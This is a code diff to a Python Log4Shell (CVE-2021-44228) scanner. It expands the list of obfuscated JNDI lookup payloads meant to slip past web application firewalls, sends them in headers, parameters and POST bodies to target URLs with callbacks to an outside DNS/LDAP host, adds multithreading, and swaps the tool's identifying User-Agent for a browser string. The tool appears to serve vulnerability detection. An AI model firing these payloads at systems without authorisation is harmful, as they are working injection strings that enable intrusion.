@@ -16,13 +16,15 @@ import sys
 from urllib import parse as urlparse
 import base64
 import json
-import random
+import hashlib
 from uuid import uuid4
 from base64 import b64encode
 from Crypto.Cipher import AES, PKCS1_OAEP
 from Crypto.PublicKey import RSA
 from Crypto.Hash import SHA256
 from termcolor import cprint
+import concurrent.futures
+from datetime import datetime
 
 
 # Disable SSL warnings
@@ -43,29 +45,62 @@ if len(sys.argv) <= 1:
 
 
 default_headers = {
-    'User-Agent': 'log4j-scan (https://github.com/mazen160/log4j-scan)',
-    # 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36',
+    #'User-Agent': 'log4j-scan (https://github.com/mazen160/log4j-scan)',
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36',
     'Accept': '*/*'  # not being tested to allow passing through checks on Accept header in older web-servers
 }
 post_data_parameters = ["username", "user", "email", "email_address", "password"]
 timeout = 4
 
-waf_bypass_payloads = ["${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{{callback_host}}/{{random}}}",
-                       "${${::-j}ndi:rmi://{{callback_host}}/{{random}}}",
-                       "${jndi:rmi://{{callback_host}}}",
-                       "${${lower:jndi}:${lower:rmi}://{{callback_host}}/{{random}}}",
-                       "${${lower:${lower:jndi}}:${lower:rmi}://{{callback_host}}/{{random}}}",
-                       "${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://{{callback_host}}/{{random}}}",
-                       "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://{{callback_host}}/{{random}}}",
-                       "${jndi:dns://{{callback_host}}}",
+waf_bypass_payloads = ["${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://va-{{identifier}}.{{callback_host}}/}",
+                        "${${::-j}${::-n}${::-d}${::-i}:${::-d}${::-n}${::-s}://sf-{{identifier}}.{{callback_host}}/}",
+                        "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}{::-p}://qz-{{identifier}}.{{callback_host}}/}",
+                        "${${::-j}ndi:rmi://ad-{{identifier}}.{{callback_host}}}",
+                        "${${::-j}ndi:dns://vcx-{{identifier}}.{{callback_host}}}",
+                        "${${::-j}ndi:ldap://ew-{{identifier}}.{{callback_host}}}",
+                        "${jndi:rmi://vc-{{identifier}}.{{callback_host}}}",
+                        "${jndi:dns://wer-{{identifier}}.{{callback_host}}}",
+                        "${jndi:ldap://avas-{{identifier}}.{{callback_host}}}",
+                        "${${lower:jndi}:${lower:rmi}://tew-{{identifier}}.{{callback_host}}}",
+                        "${${lower:jndi}:${lower:dns}://tqe-{{identifier}}.{{callback_host}}}",
+                        "${${lower:jndi}:${lower:ldap}://jf-{{identifier}}.{{callback_host}}}",
+                        "${${lower:${lower:jndi}}:${lower:rmi}://bd-{{identifier}}.{{callback_host}}}",
+                        "${${lower:${lower:jndi}}:${lower:dns}://vv-{{identifier}}.{{callback_host}}}",
+                        "${${lower:${lower:jndi}}:${lower:ldap}://se-{{identifier}}.{{callback_host}}}",
+                        "${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://ca-{{identifier}}.{{callback_host}}}",
+                        "${${lower:j}${lower:n}${lower:d}i:${lower:dns}://ba-{{identifier}}.{{callback_host}}}",
+                        "${${lower:j}${lower:n}${lower:d}i:${lower:ldap}://na-{{identifier}}.{{callback_host}}}",
+                        "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://yf-{{identifier}}.{{callback_host}}}",
+                        "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:d}n${lower:s}}://ed-{{identifier}}.{{callback_host}}}",
+                        "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:l}d${lower:a}p}://fe-{{identifier}}.{{callback_host}}}",
+                        "${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-r}mi${env:ENV_NAME:-:}//wa-{{identifier}}.{{callback_host}}}",
+                        "${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-d}ns${env:ENV_NAME:-:}//da-{{identifier}}.{{callback_host}}}",
+                        "${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//ff-{{identifier}}.{{callback_host}}}",
+                        "${j${${:-l}${:-o}${:-w}${:-e}${:-r}:n}di:rmi://mj-{{identifier}}.{{callback_host}}}",
+                        "${j${${:-l}${:-o}${:-w}${:-e}${:-r}:n}di:dns://gt-{{identifier}}.{{callback_host}}}",
+                        "${j${${:-l}${:-o}${:-w}${:-e}${:-r}:n}di:ldap://bf-{{identifier}}.{{callback_host}}}",
+                        "${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-r}mi${env:BARFOO:-:}//po-{{identifier}}.{{callback_host}}}",
+                        "${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-d}ns${env:BARFOO:-:}//hy-{{identifier}}.{{callback_host}}}",
+                        "${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//wv-{{identifier}}.{{callback_host}}}",
+                        "${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-r}mi${env:NaN:-:}//rn-{{identifier}}.{{callback_host}}}",
+                        "${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-d}ns${env:NaN:-:}//tm-{{identifier}}.{{callback_host}}}",
+                        "${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//ix-{{identifier}}.{{callback_host}}}",
+                        "${jndi:ldap://127.0.0.1#bm-{{identifier}}.{{callback_host}}",
+                        "${jndi:ldap://127.1.1.1#gd-{{identifier}}.{{callback_host}}}"
                        ]
 
-cve_2021_45046 = [
-                  "${jndi:ldap://127.0.0.1#{{callback_host}}:1389/{{random}}}", # Source: https://twitter.com/marcioalm/status/1471740771581652995,
-                  "${jndi:ldap://127.0.0.1#{{callback_host}}/{{random}}}",
-                  "${jndi:ldap://127.1.1.1#{{callback_host}}/{{random}}}"
-                 ]  
-
+blacklist = [
+    ".pdf",
+    ".css",
+    ".png",
+    ".js",
+    ".jpg",
+    "apple.com",
+    "google.com",
+    "bing.com",
+    "xing.com",
+    "youtube.com"
+]
 
 parser = argparse.ArgumentParser()
 parser.add_argument("-u", "--url",
@@ -108,13 +143,9 @@ parser.add_argument("--waf-bypass",
                     dest="waf_bypass_payloads",
                     help="Extend scans with WAF bypass payloads.",
                     action='store_true')
-parser.add_argument("--test-CVE-2021-45046",
-                    dest="cve_2021_45046",
-                    help="Test using payloads for CVE-2021-45046 (detection payloads).",
-                    action='store_true')
 parser.add_argument("--dns-callback-provider",
                     dest="dns_callback_provider",
-                    help="DNS Callback provider (Options: dnslog.cn, interact.sh) - [Default: interact.sh].",
+                    help="DNS Callback provider [Default: interact.sh].",
                     default="interact.sh",
                     action='store')
 parser.add_argument("--custom-dns-callback-host",
@@ -125,6 +156,16 @@ parser.add_argument("--disable-http-redirects",
                     dest="disable_redirects",
                     help="Disable HTTP redirects. Note: HTTP redirects are useful as it allows the payloads to have higher chance of reaching vulnerable systems.",
                     action='store_true')
+parser.add_argument("--threads",
+                    dest="thread_workers",
+                    help="Amount of threads. Default is 20.",
+                    default="20",
+                    action='store')
+parser.add_argument("--test",
+                    dest="test_host",
+                    help="A canary host to test before the main list. Logs GET and POST requests examples. Default: http://127.0.0.1:8080",
+                    default="http://127.0.0.1:8080",
+                    action='store')
 
 args = parser.parse_args()
 
@@ -132,6 +173,7 @@ args = parser.parse_args()
 proxies = {}
 if args.proxy:
     proxies = {"http": args.proxy, "https": args.proxy}
+
 
 def get_fuzzing_headers(payload):
     fuzzing_headers = {}
@@ -141,7 +183,11 @@ def get_fuzzing_headers(payload):
             i = i.strip()
             if i == "" or i.startswith("#"):
                 continue
-            fuzzing_headers.update({i: payload})
+            if "Authorization" in i:
+                 fuzzing_headers.update({i: "Token " + payload})
+            else:
+                fuzzing_headers.update({i: payload})
+                
     if args.exclude_user_agent_fuzzing:
         fuzzing_headers["User-Agent"] = default_headers["User-Agent"]
 
@@ -152,41 +198,20 @@ def get_fuzzing_headers(payload):
 def get_fuzzing_post_data(payload):
     fuzzing_post_data = {}
     for i in post_data_parameters:
-        fuzzing_post_data.update({i: payload})
+        if i == "Authorization":
+                fuzzing_post_data.update({i: "Token " + payload})
+        else:
+            fuzzing_post_data.update({i: payload})
     return fuzzing_post_data
 
 
-def generate_waf_bypass_payloads(callback_host, random_string):
+def generate_waf_bypass_payloads(callback_host, identifier):
     payloads = []
     for i in waf_bypass_payloads:
         new_payload = i.replace("{{callback_host}}", callback_host)
-        new_payload = new_payload.replace("{{random}}", random_string)
+        new_payload = new_payload.replace("-{{identifier}}", identifier)
         payloads.append(new_payload)
     return payloads
-
-def get_cve_2021_45046_payloads(callback_host, random_string):
-    payloads = []
-    for i in cve_2021_45046:
-        new_payload = i.replace("{{callback_host}}", callback_host)
-        new_payload = new_payload.replace("{{random}}", random_string)
-        payloads.append(new_payload)
-    return payloads
-
-
-class Dnslog(object):
-    def __init__(self):
-        self.s = requests.session()
-        req = self.s.get("http://www.dnslog.cn/getdomain.php",
-                         proxies=proxies,
-                         timeout=30)
-        self.domain = req.text
-
-    def pull_logs(self):
-        req = self.s.get("http://www.dnslog.cn/getrecords.php",
-                         proxies=proxies,
-                         timeout=30)
-        return req.json()
-
 
 class Interactsh:
     # Source: https://github.com/knownsec/pocsuite3/blob/master/pocsuite3/modules/interactsh/__init__.py
@@ -277,62 +302,120 @@ def parse_url(url):
             "host":  urlparse.urlparse(url).netloc.split(":")[0],
             "file_path": file_path})
 
-
-def scan_url(url, callback_host):
+def scan_test_host(url, callback_host, logfile):
+    
+    cprint(f"[•] Checking Test Host {url}", "yellow")
     parsed_url = parse_url(url)
-    random_string = ''.join(random.choice('0123456789abcdefghijklmnopqrstuvwxyz') for i in range(7))
-    payload = '${jndi:ldap://%s.%s/%s}' % (parsed_url["host"], callback_host, random_string)
+    identifier = hashlib.md5(parsed_url["host"].encode('utf-8')).hexdigest()[:5]
+    payload = '${jndi:ldap://%s/%s}' % (callback_host,  identifier)
     payloads = [payload]
+    
     if args.waf_bypass_payloads:
-        payloads.extend(generate_waf_bypass_payloads(f'{parsed_url["host"]}.{callback_host}', random_string))
-    if args.cve_2021_45046:
-        cprint(f"[•] Scanning for CVE-2021-45046 (Log4j v2.15.0 Patch Bypass - RCE)", "yellow")
-        payloads = get_cve_2021_45046_payloads(f'{parsed_url["host"]}.{callback_host}', random_string)
+        payloads.extend(generate_waf_bypass_payloads(f'{callback_host}', identifier))
 
     for payload in payloads:
-        cprint(f"[•] URL: {url} | PAYLOAD: {payload}", "cyan")
-        if args.request_type.upper() == "GET" or args.run_all_tests:
-            try:
-                requests.request(url=url,
-                                 method="GET",
-                                 params={"v": payload},
-                                 headers=get_fuzzing_headers(payload),
-                                 verify=False,
-                                 timeout=timeout,
-                                 allow_redirects=(not args.disable_redirects),
-                                 proxies=proxies)
-            except Exception as e:
-                cprint(f"EXCEPTION: {e}")
+        print(f"[•] URL: {url} | PAYLOAD: {payload}", file=logfile)
+        print(f"[•] Testing GET", file=logfile)
+        try:
+            req = requests.request(url=url,
+                            method="GET",
+                            params={"v": payload},
+                            headers=get_fuzzing_headers(payload),
+                            verify=False,
+                            timeout=timeout,
+                            allow_redirects=(not args.disable_redirects),
+                            proxies=proxies)
+            print (req.request.url, file=logfile)
+            print (req.request.headers, file=logfile)
+        except Exception as e:
+            cprint(f"EXCEPTION: {e}")
 
-        if args.request_type.upper() == "POST" or args.run_all_tests:
-            try:
-                # Post body
-                requests.request(url=url,
-                                 method="POST",
-                                 params={"v": payload},
-                                 headers=get_fuzzing_headers(payload),
-                                 data=get_fuzzing_post_data(payload),
-                                 verify=False,
-                                 timeout=timeout,
-                                 allow_redirects=(not args.disable_redirects),
-                                 proxies=proxies)
-            except Exception as e:
-                cprint(f"EXCEPTION: {e}")
+        print(f"[•] Testing POST", file=logfile)
 
-            try:
-                # JSON body
-                requests.request(url=url,
-                                 method="POST",
-                                 params={"v": payload},
-                                 headers=get_fuzzing_headers(payload),
-                                 json=get_fuzzing_post_data(payload),
-                                 verify=False,
-                                 timeout=timeout,
-                                 allow_redirects=(not args.disable_redirects),
-                                 proxies=proxies)
-            except Exception as e:
-                cprint(f"EXCEPTION: {e}")
+        try:
+            req = requests.request(url=url,
+                            method="POST",
+                            params={"v": payload},
+                            headers=get_fuzzing_headers(payload),
+                            data=get_fuzzing_post_data(payload),
+                            verify=False,
+                            timeout=timeout,
+                            allow_redirects=(not args.disable_redirects),
+                            proxies=proxies)
+            print (req.request.url, file=logfile)
+            print (req.request.headers, file=logfile)
+            print (req.request.body, file=logfile)
+        except Exception as e:
+            cprint(f"EXCEPTION: {e}")
 
+def run_scan(url, payload, logfile):
+    print(f"[•] URL: {url} | PAYLOAD: {payload}", file=logfile)
+    if args.request_type.upper() == "GET" or args.run_all_tests:
+        try:
+            requests.request(url=url,
+                            method="GET",
+                            params={"v": payload},
+                            headers=get_fuzzing_headers(payload),
+                            verify=False,
+                            timeout=timeout,
+                            allow_redirects=(not args.disable_redirects),
+                            proxies=proxies)
+        except Exception as e:
+            cprint(f"EXCEPTION: {e}")
+
+    if args.request_type.upper() == "POST" or args.run_all_tests:
+        try:
+            # Post body
+            requests.request(url=url,
+                            method="POST",
+                            params={"v": payload},
+                            headers=get_fuzzing_headers(payload),
+                            data=get_fuzzing_post_data(payload),
+                            verify=False,
+                            timeout=timeout,
+                            allow_redirects=(not args.disable_redirects),
+                            proxies=proxies)
+        except Exception as e:
+            cprint(f"EXCEPTION: {e}")
+
+        try:
+            # JSON body
+            requests.request(url=url,
+                            method="POST",
+                            params={"v": payload},
+                            headers=get_fuzzing_headers(payload),
+                            json=get_fuzzing_post_data(payload),
+                            verify=False,
+                            timeout=timeout,
+                            allow_redirects=(not args.disable_redirects),
+                            proxies=proxies)
+        except Exception as e:
+            cprint(f"EXCEPTION: {e}")
+
+def scan_url(url, callback_host, logfile):
+    parsed_url = parse_url(url)
+    identifier = hashlib.md5(parsed_url["host"].encode('utf-8')).hexdigest()[:5]
+    payload = '${jndi:ldap://%s/%s}' % (callback_host,  identifier)
+    payloads = [payload]
+
+    if args.waf_bypass_payloads:
+        payloads.extend(generate_waf_bypass_payloads(f'{callback_host}', identifier))
+    
+    if args.thread_workers:
+        workers = int(args.thread_workers)
+    else: 
+        workers = 20  
+
+    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as executor:
+        futures = []
+        for payload in payloads:
+            futures.append(executor.submit(run_scan, url, payload, logfile))     
+
+def blacklist_check(i):
+    for rec in blacklist:
+        if rec in i:
+            return False
+    return True
 
 def main():
     urls = []
@@ -343,8 +426,9 @@ def main():
             for i in f.readlines():
                 i = i.strip()
                 if i == "" or i.startswith("#"):
-                    continue
-                urls.append(i)
+                    continue                
+                if blacklist_check(i) and i not in urls:
+                    urls.append(i)
 
     dns_callback_host = ""
     if args.custom_dns_callback_host:
@@ -354,19 +438,25 @@ def main():
         cprint(f"[•] Initiating DNS callback server ({args.dns_callback_provider}).")
         if args.dns_callback_provider == "interact.sh":
             dns_callback = Interactsh()
-        elif args.dns_callback_provider == "dnslog.cn":
-            dns_callback = Dnslog()
         else:
             raise ValueError("Invalid DNS Callback provider")
         dns_callback_host = dns_callback.domain
 
     cprint("[%] Checking for Log4j RCE CVE-2021-44228.", "magenta")
-    for url in urls:
-        cprint(f"[•] URL: {url}", "magenta")
-        scan_url(url, dns_callback_host)
+    cprint(str(len(urls)) + " URLs will be queried.", "magenta")
+    filename = datetime.now().strftime("%H-%M-%S") + "-log4jscan.log"
+    with open(filename, 'a') as logfile:
+        if args.test_host:
+            scan_test_host(args.test_host, dns_callback_host, logfile)
+        for url in urls:
+            cprint("[•] " + str(urls.index(url)) + f" URL: {url}", "magenta")
+            scan_url(url, dns_callback_host, logfile)
 
     if args.custom_dns_callback_host:
         cprint("[•] Payloads sent to all URLs. Custom DNS Callback host is provided, please check your logs to verify the existence of the vulnerability. Exiting.", "cyan")
+        now = datetime.now()
+        current_time = now.strftime("%H:%M:%S")
+        print("Scan finished ", current_time)
         return
 
     cprint("[•] Payloads sent to all URLs. Waiting for DNS OOB callbacks.", "cyan")
@@ -379,7 +469,6 @@ def main():
         cprint("[!!!] Target Affected", "yellow")
         for i in records:
             cprint(i, "yellow")
-
 
 if __name__ == "__main__":
     try:
